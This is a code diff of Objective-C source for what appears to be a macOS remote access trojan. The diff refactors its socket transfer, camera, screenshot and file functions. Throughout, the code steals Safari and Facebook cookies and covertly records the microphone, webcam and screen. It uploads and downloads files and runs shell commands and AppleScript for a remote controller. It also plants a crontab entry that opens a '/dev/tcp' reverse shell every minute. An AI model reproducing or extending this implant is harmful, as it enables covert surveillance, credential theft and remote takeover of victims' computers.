@@ -20,19 +20,6 @@ char lastBytes[64];
     [self sendString:@""]; //bang
 }
 
--(NSString *)forgetFirst:(NSArray *)args {
-    int x = 1;
-    NSString *path = @"";
-    for (NSString *tpath in args) {
-        if (x != 1) {
-            path = [NSString stringWithFormat:@"%@%@ ",path,tpath];
-        }
-        x++;
-    }
-    return [path substringToIndex:[path length] - 1];
-}
-
-
 char* parseBinary(int* searchChars,int sizeOfSearch) {
     NSString *cookieJarPath = [NSString stringWithFormat:@"%@/Library/Cookies/Cookies.binarycookies",NSHomeDirectory()];
     cookieJar = fopen([cookieJarPath UTF8String], "rb+");
@@ -61,6 +48,7 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
     };
     return "null";
 }
+
 //MARK: Socketry
 
 int sockfd;
@@ -82,12 +70,10 @@ int sockfd;
     return result;
 }
 
--(void)sendData:(NSData *)data {
-    unsigned char *prepData = (unsigned char *)[data bytes];
-    write (sockfd, prepData, sizeof(data));
-}
+
 
 -(void)sendString:(NSString *)string {
+    string = [string stringByReplacingOccurrencesOfString:@"’" withString:@"'"];
     NSString *finalstr = [NSString stringWithFormat:@"%@%@",[escryptor encryptNSStringToB64:self.skey :string],_terminator];
     write (sockfd, [finalstr UTF8String], finalstr.length + 11);
 }
@@ -104,6 +90,41 @@ int sockfd;
     NSString *finalstr = [NSString stringWithFormat:@"%@%@",
                           [escryptor encryptNSStringToB64:self.skey :string],reversed];
     write (sockfd, [finalstr UTF8String], finalstr.length + 11);
+}
+
+
+-(void)receiveFileData:(NSString *)saveToPath :(long)fileSize {
+    [self blank];
+    long bsize = fileSize;
+    char buffer[bsize];
+    NSMutableData *data = [NSMutableData alloc];
+    //we use both chunks to make sure we never check an incomplete terminator string
+    NSString *lastchunk = @"";
+    NSString *thischunk = @"";
+    while(read (sockfd, &buffer, sizeof(buffer))) {
+        //append data
+        thischunk = [NSString stringWithFormat:@"%s",buffer];
+        [data appendBytes:[thischunk UTF8String] length:thischunk.length];
+        //detect terminator, decrypt data, write to file
+        memset(buffer,'\0',bsize);
+        if (!([[NSString stringWithFormat:@"%@%@",lastchunk,thischunk] rangeOfString:_terminator].location == NSNotFound)) {
+            //fuck this
+            NSString *datastr = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+            datastr = [datastr substringToIndex:[datastr length] - 16];
+            NSData *nsdataDecoded = [data initWithBase64EncodedString:datastr options:NSDataBase64DecodingIgnoreUnknownCharacters];
+            [nsdataDecoded writeToFile:saveToPath atomically:true];
+            break;
+        }
+        lastchunk = [NSString stringWithFormat:@"%s",buffer];
+    }
+    [self blank];
+}
+
+-(void)sendFileData:(NSData*)fileData {
+    NSData *encryptedData = [escryptor encryptNSData:self.skey :fileData];
+    [self sendString:[NSString stringWithFormat:@"%lu",encryptedData.length]];
+    write (sockfd, [encryptedData bytes], encryptedData.length);
+    write (sockfd, [_terminator UTF8String], _terminator.length);
 }
 
 //MARK: Mic
@@ -123,10 +144,10 @@ int sockfd;
     }
     else if ([arg isEqualToString:@"stop"]) {
         if ([self stopAudio]) {
-            [self download:@"/tmp/.avatmp"];
+            [self sendString:@"1"];
         }
         else {
-            [self sendString:@"-1"];
+            [self sendString:@"Not currently recording"];
         }
     }
     else {
@@ -147,6 +168,7 @@ int sockfd;
                     [NSNumber numberWithInt: AVAudioQualityHigh],AVEncoderAudioQualityKey, nil];
     soundRecorder = [[AVAudioRecorder alloc] initWithURL: soundFile settings: soundSetting error: nil];
 }
+
 -(BOOL)stopAudio {
     if (micinuse) {
         [soundRecorder stop];
@@ -158,6 +180,7 @@ int sockfd;
     }
     
 }
+
 -(BOOL)recordAudio {
     if (!micinuse) {
         [self initmic];
@@ -172,8 +195,9 @@ int sockfd;
 
 //MARK: Camera
 
--(void)takePicture {
+-(NSData*)takePicture {
     __block BOOL done = NO;
+    __block NSData *pictureData = nil;
     [self captureWithBlock:^(NSData *imageData)
      {
          done = YES;
@@ -181,14 +205,14 @@ int sockfd;
              [self sendString:@"-3"];
          }
          else {
-             [self sendString:[NSString stringWithFormat:@"%lu",imageData.length]];
-             [self sendFile:imageData];
+             pictureData = imageData;
          }
      }];
     while (!done) {
         [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.05]];
     }
     [self stopcapture];
+    return pictureData;
 }
 
 - (AVCaptureDevice *)getcapturedevice
@@ -203,6 +227,7 @@ int sockfd;
     }
     return captureDevice;
 }
+
 -(void)initcamera {
     self.session = [[AVCaptureSession alloc] init];
     self.session.sessionPreset = AVCaptureSessionPresetiFrame1280x720;
@@ -270,7 +295,6 @@ int sockfd;
 
 -(void)directoryList:(NSString *)arg {
     //basically "ls"
-    printf("directory listing %s\n",[_skey UTF8String]);
     NSArray *files;
     NSString *dir = [fileManager currentDirectoryPath];
     if (![arg isEqualToString:@""]) {
@@ -393,174 +417,21 @@ int sockfd;
     }
 }
 
--(void)download:(NSString *)arg {
+-(NSData*)filePathToData:(NSString *)arg {
     BOOL isdir;
-    
     if ([fileManager fileExistsAtPath:arg isDirectory:&isdir]) {
         if (isdir) {
             [self sendString:[NSString stringWithFormat:@"%@ is a directory",arg]];
         }
         else {
-            NSData *filedata = [fileManager contentsAtPath:arg];
-            [self sendString:[NSString stringWithFormat:@"%lu",filedata.length]];
-            [self sendFile:filedata];
+            return [fileManager contentsAtPath:arg];
         }
     }
     else {
         [self sendString:[NSString stringWithFormat:@"%@ not found",arg]];
     }
+    return nil;
 }
-
-/* we will come back to this
-
--(void)encryptFile:(NSString *)arg {
-    BOOL isdir;
-    NSString *filepath = @"";
-    if (args.count > 2) {
-        filepath = [self forgetFirst:args];
-        NSString *last = [NSString stringWithFormat:@" %@",args[args.count -1]];
-        filepath = [filepath stringByReplacingOccurrencesOfString:last withString:@""];
-    }
-    else {
-        [self sendString:@"Usage: encrypt file password1234"];
-        return;
-    }
-    
-    if ([fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
-        if (isdir) {
-            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]];
-        }
-        else {
-            NSData *filedata = [fileManager contentsAtPath:filepath];
-            [self sendString:[NSString stringWithFormat:@"Encrypting %@.aes with 256 Bit AES",filepath]];
-            filedata = [filedata AES256EncryptWithKey:args[args.count -1]];
-            [filedata writeToFile:[NSString stringWithFormat:@"%@.aes",filepath] atomically:true];
-            [fileManager removeItemAtPath:filepath error:nil];
-        }
-    }
-    else {
-        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]];
-    }
-}
-
--(void)decryptFile:(NSString *)arg {
-    BOOL isdir;
-    NSString *filepath = @"";
-    if (args.count > 2) {
-        filepath = [self forgetFirst:args];
-        NSString *last = [NSString stringWithFormat:@" %@",args[args.count -1]];
-        filepath = [filepath stringByReplacingOccurrencesOfString:last withString:@""];
-    }
-    else {
-        [self sendString:@"Usage: decrypt file.aes password1234"];
-        return;
-    }
-    
-    if ([fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
-        if (isdir) {
-            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]];
-        }
-        else {
-            if ([filepath containsString:@".aes"]) {
-                NSData *filedata = [fileManager contentsAtPath:filepath];
-                [self sendString:[NSString stringWithFormat:@"Decrypting %@",filepath]];
-                filedata = [filedata AES256DecryptWithKey:args[args.count -1]];
-                [filedata writeToFile:[filepath substringToIndex:[filepath length] - 4] atomically:true];
-                [fileManager removeItemAtPath:filepath error:nil];
-
-            }
-            else {
-                [self sendString:[NSString stringWithFormat:@"Only supports .aes files"]];
-            }
-        }
-    }
-    else {
-        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]];
-    }
-}
-*/
-
--(void)receiveFile:(NSString *)saveToPath {
-    //GLOBAL
-    NSString *b64data;
-    NSString *chunk;
-    long bsize = 1024;
-    char buffer[bsize];
-    
-    while(read (sockfd, &buffer, sizeof(buffer))) {
-        //append chunk limited to 64 chars
-        long blen = strlen(buffer);
-        if (blen < bsize) {
-            bsize = blen;
-        }
-        chunk = [[NSString stringWithFormat:@"%s",buffer] substringToIndex:bsize];
-        b64data = [NSString stringWithFormat:@"%@%@",b64data,chunk];
-        
-        //check for terminating flag
-        if (!([b64data rangeOfString:_terminator].location == NSNotFound)) {
-            //remove terminator
-            b64data = [b64data stringByReplacingOccurrencesOfString:_terminator withString:@""];
-            //get data
-            NSData *mydata = [[NSData alloc] initWithBase64EncodedString:b64data options: NSDataBase64DecodingIgnoreUnknownCharacters];
-            [mydata writeToFile:@"unfinished.txt" atomically:true];
-            //exit while loop
-            return;
-        }
-        //reset buffer
-        memset(buffer,'\0',bsize);
-    }
-}
-
-
--(void)sendFile:(NSData *)fileData {
-    NSString *writeToFileName = @"/private/tmp/.tmpenc";
-    fileData = [fileData AES256EncryptWithKey:_skey];
-    [fileData writeToFile:writeToFileName atomically:true];
-    
-    char bufferin[256];
-    FILE *fp;
-    fp = fopen([writeToFileName UTF8String], "r");
-    
-    /*
-     stream file to socket
-     some padding will exist but only at the end of the file
-     we can handle this server side by removing the offset
-     */
-    while (!feof(fp))
-    {
-        unsigned long nRead = fread(bufferin, sizeof(char), 256, fp);
-        if (nRead <= 0)
-        printf("ERROR reading file\n");
-        
-        char *pBuf = bufferin;
-        while (nRead > 0)
-        {
-            long nSent = send(sockfd, pBuf, nRead, 0);
-            
-            if (nSent == -1)
-            {
-                fd_set writefd;
-                FD_ZERO(&writefd);
-                FD_SET(sockfd, &writefd);
-                
-                if (select(0, NULL, &writefd, NULL, NULL) != 1)
-                printf("ERROR waiting to write to socket\n");
-                continue;
-            }
-            
-            if (nSent == 0)
-            printf("DISCONNECTED writing to socket\n");
-            
-            pBuf += nSent;
-            nRead -= nSent;
-        }
-    }
-    //our end send file command
-    write(sockfd, [_terminator UTF8String], _terminator.length);
-}
-
-
-//MARK: Misc
 
 -(void)idleTime {
     //returns number of seconds
@@ -593,7 +464,6 @@ int sockfd;
     [self sendString:[NSString stringWithFormat:@"%d",processID]];
 }
 
-    
 -(void)getFacebook {
     NSString *result = @"";
     int fb_cuser[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6f, 0x6f, 0x6b,
@@ -646,15 +516,13 @@ int sockfd;
         err= IODisplayGetFloatParameter(service,
                                         kNilOptions, kDisplayBrightness,
                                         &brightness);
-
-        
         IODisplaySetFloatParameter(service, kNilOptions, kDisplayBrightness, [arg floatValue]);
     }
     [self blank];
 
 }
 
--(void)screenshot {
+-(NSData *)screenshot {
     CGImageRef screenShot = CGWindowListCreateImage(CGRectInfinite, kCGWindowListOptionOnScreenOnly, kCGNormalWindowLevel, kCGWindowImageDefault);
     NSBitmapImageRep *bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:screenShot];
     // Create an NSImage and add the bitmap rep to it...
@@ -666,26 +534,11 @@ int sockfd;
     NSNumber *compressionFactor = [NSNumber numberWithFloat:0.9];
     NSDictionary *imageProps = [NSDictionary dictionaryWithObject:compressionFactor forKey:NSImageCompressionFactor];
     imageData = [imageRep representationUsingType:NSJPEGFileType properties:imageProps];
-    [self sendString:[NSString stringWithFormat:@"%lu",imageData.length]];
-    [self sendFile:imageData];
+    return imageData;
 }
 
--(void)setVolume:(NSString *)arg {
-    NSAppleScript* asdown = [[NSAppleScript alloc] initWithSource:@"output volume of (get volume settings)"];
-    NSAppleEventDescriptor *result = [asdown executeAndReturnError:nil];
-    
-    NSAppleScript* asdown2 = [[NSAppleScript alloc] initWithSource:[NSString stringWithFormat: @"set volume output volume (%@ - 6.25)", [result stringValue]]];
-}
--(void)getVolume {
-    NSAppleScript* asdown = [[NSAppleScript alloc] initWithSource:@"output volume of (get volume settings)"];
-    NSAppleEventDescriptor *result = [asdown executeAndReturnError:nil];
-    
-    NSAppleScript* asdown2 = [[NSAppleScript alloc] initWithSource:[NSString stringWithFormat: @"set volume output volume (%@ - 6.25)", [result stringValue]]];
-}
-
--(void)removePersistence:(NSString *)ip
-                        :(NSString *)port {
-    NSString *persist = [NSString stringWithFormat:@"* * * * * bash &> /dev/tcp/%@/%@ 0>&1\n",ip,port];
+-(void)removePersistence:(NSString *)ip :(int)port {
+    NSString *persist = [NSString stringWithFormat:@"* * * * * bash &> /dev/tcp/%@/%d 0>&1\n",ip,port];
     system("crontab -l > /private/tmp/.cryon");
     NSData *crondata = [fileManager contentsAtPath:@"/private/tmp/.cryon"];
     NSString *newcron = [[NSString alloc]initWithData:crondata encoding:NSUTF8StringEncoding];
@@ -695,10 +548,9 @@ int sockfd;
     [self sendString:@""];
 }
 
--(void)persistence:(NSString *)ip
-                  :(NSString *)port {
+-(void)persistence:(NSString *)ip :(int)port {
     [self removePersistence:ip:port];
-    NSString *payload = [NSString stringWithFormat:@"crontab -l > /private/tmp/.cryon; echo '* * * * * bash &> /dev/tcp/%@/%@ 0>&1' >> /private/tmp/.cryon;crontab /private/tmp/.cryon; rm /private/tmp/.cryon",ip,port];
+    NSString *payload = [NSString stringWithFormat:@"crontab -l > /private/tmp/.cryon; echo '* * * * * bash &> /dev/tcp/%@/%d 0>&1' >> /private/tmp/.cryon;crontab /private/tmp/.cryon; rm /private/tmp/.cryon",ip,port];
     system([payload UTF8String]);
     [self sendString:@""];
 }
@@ -741,8 +593,6 @@ int sockfd;
                            [self liveSendString:newOutput];
                            [stdoutHandle waitForDataInBackgroundAndNotify];
                        }];
-        
-        
         [_systask launch];
         [_systask waitUntilExit];
         [[NSNotificationCenter defaultCenter] removeObserver:observer];
@@ -754,9 +604,12 @@ int sockfd;
 -(void)runAppleScript:(NSString *)arg {
     NSAppleScript *aps = [[NSAppleScript alloc] initWithSource:arg];
     NSError *error;
-    [aps executeAndReturnError:&error];
+    NSAppleEventDescriptor *asDescriptor = [aps executeAndReturnError:&error];
     if (error == NULL) {
-        [self blank];
+        if ([[asDescriptor stringValue] length] < 1)
+            [self blank];
+        else
+            [self sendString:[NSString stringWithFormat:@"%@",[asDescriptor stringValue]]];
     }
     else {
         [self sendString:[NSString stringWithFormat:@"%@",error]];
@@ -804,7 +657,6 @@ int sockfd;
         
         IOObjectRelease( service );
     }
-    
     return (__bridge NSData *)(result);
 }
 
@@ -823,19 +675,7 @@ int sockfd;
         else
             [result appendFormat: @"%02hhx", bytes[i]];
     }
-    
     return ( [result copy] );
-}
-
-+ (NSString *)reverseString:(NSString *)str {
-    NSMutableString *reversed = [NSMutableString string];
-    NSInteger charIndex = [str length];
-    while (charIndex > 0) {
-        charIndex--;
-        NSRange subRange = NSMakeRange(charIndex, 1);
-        [reversed appendString:[str substringWithRange:subRange]];
-    }
-    return reversed;
 }
 
 @end
